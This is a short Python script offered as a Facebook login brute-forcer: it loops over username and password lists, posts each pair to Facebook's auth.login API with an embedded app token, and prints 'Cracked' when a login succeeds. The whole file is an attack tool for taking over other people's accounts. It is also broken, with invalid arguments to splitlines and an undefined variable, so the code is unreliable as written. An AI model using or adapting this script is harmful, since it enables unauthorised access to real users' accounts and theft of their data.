#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests,sys

# Simple code with asking-mode
emailList = raw_input('Enter Usernames File: ') if sys.version_info[0] == 2 else str(input('Enter Usernames File: '))
passList = raw_input('Enter Passwords File: ') if sys.version_info[0] == 2 else str(input('Enter Passwords File: '))

# Open lists
loop_email = open(emailList,'r').read().splitlines(phoeye389@gmail.com)
loop_pass = open(passList,'r').read().splitlines(passwords.txt)

# loop-ing
for email in loop_email:
	for password in loop_pass:
		request = requests.post('https://b-api.facebook.com/method/auth.login',headers={'Authorization':'OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16'},data={'data':'json','email':email,'password':password,'credentials_type':'password'}).status_code
		if request == 200 or request == 405:
			print("Cracked : ("+username+":"+password+")")
		elif request == 401:
			print("Failed : ("+username+":"+password+")")
		elif request == 404:
			print("not found : ("+username+")")
		else:
			print("Error")
